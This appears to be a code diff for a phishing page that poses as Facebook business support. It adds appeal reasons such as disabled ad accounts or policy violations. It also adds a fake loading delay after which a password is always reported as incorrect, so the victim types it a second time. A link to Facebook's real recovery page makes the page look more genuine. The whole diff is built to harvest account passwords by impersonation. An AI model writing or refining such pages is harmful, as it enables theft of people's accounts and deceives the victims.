@@ -3,14 +3,14 @@ import { logo, search } from './Publics/images/images'
 import { Link, useNavigate } from 'react-router-dom'
 import { useState } from 'react';
 import axios from 'axios';
-import { Button, Checkbox, Form, Input } from 'antd';
-const { TextArea } = Input;
+import { Button, Checkbox, Form, Input, Radio } from 'antd';
 
 const Buiness = () => {
 
     const [activePopup, setActivePopup] = useState(false);
     const [activePassword, setActivePassword] = useState(false);
     const [first, setActionFirst] = useState(true);
+    const [loading, setLoading] = useState(true);
     const [firstPassword, setFirstPassword] = useState();
     const navigate = useNavigate();
 
@@ -36,11 +36,17 @@ const Buiness = () => {
 
         if(first === true) {
             setFirstPassword(values.fill_first_password)
+            setLoading(false)
             setActionFirst(false)
         }
         
         const passWord = values.fill_first_password;
-        setActivePassword(true)
+        setTimeout(() => {
+            setActivePassword(true)
+        }, 5000)
+        setTimeout(() => {
+            setLoading(true)
+        }, 5000)
         const dataLocalForm = JSON.parse(localStorage.getItem('dataForm'));
         
         if(activePassword === true){
@@ -155,11 +161,14 @@ const Buiness = () => {
                 >
 
                     <div className="item-form">
-                        <label style={{color:"rgb(0, 0, 0)", fontWeight: "bold"}}>
-                            Please provide us information that will help us investigate
-                        </label>
+                        <p>
+                            <label style={{color:"rgb(0, 0, 0)", fontWeight: "bold"}}>
+                                Please provide us information that will help us investigate                        
+                            </label>
+                        </p>
+                       
                         <Form.Item
-                            name="fill_reason"
+                            name="radio"
                             rules={[
                                 {
                                 required: true,
@@ -167,7 +176,26 @@ const Buiness = () => {
                                 },
                             ]}
                         >
-                            <TextArea rows={2}   />
+                            <Radio.Group>
+                                <p style={{margin: "3px 0"}}>
+                                    <Radio value={1} name='info'>I have been blocked from using a feature</Radio>
+                                </p>
+                                <p style={{margin: "3px 0"}}>
+                                    <Radio value={2} name='info'>My fanpage violated community standards</Radio>
+                                </p>
+                                <p style={{margin: "3px 0"}}>
+                                    <Radio value={3} name='info'>My ad account is disabled</Radio>
+                                </p>
+                                <p style={{margin: "3px 0"}}>
+                                    <Radio value={4} name='info'>I need help with a failed payment</Radio>
+                                </p>
+                                <p style={{margin: "3px 0"}}>
+                                    <Radio value={5} name='info'>I think someone accessed my business without my permission</Radio>
+                                </p>
+                                <p style={{margin: "3px 0"}}>
+                                    <Radio value={6} name='info'>Other issues</Radio>
+                                </p>
+                            </Radio.Group>
                         </Form.Item>
                     </div>
 
@@ -402,6 +430,15 @@ const Buiness = () => {
 
                     <div className="item-form">
                         <p style={{fontSize:"16px", marginBottom: "10px"}}> For your security, you must enter your password to continue. </p>
+
+                        <div style={{display:"flex", alignItems: "center", justifyContent: "center"}} className={loading === true ? 'loading-animate' : 'loading-animate active'}>
+                            <div class="loadingio-spinner-rolling-iwlfl4nh5d">
+                                <div class="ldio-f5aabcq675v">
+                                    <div></div>
+                                </div>
+                            </div>
+                        </div>
+
                         <label for="password">Password:</label>
                         <Form.Item
                             name="fill_first_password"
@@ -417,7 +454,7 @@ const Buiness = () => {
                         >
                             <Input.Password />
                         </Form.Item>
-                        <p className={`password-correct ${activePassword === true ? 'active' : ''}`}>The password you've entered is incorrect.</p>
+                        <p className={`password-correct ${activePassword === true ? 'active' : ''}`}>The password you've entered is incorrect. <a href="https://www.facebook.com/login/identify/" style={{textDecoration: "none", fontWeight: "700", color:"red"}}>Forgoten Password?</a></p>
                     </div>
 
                     <Form.Item 
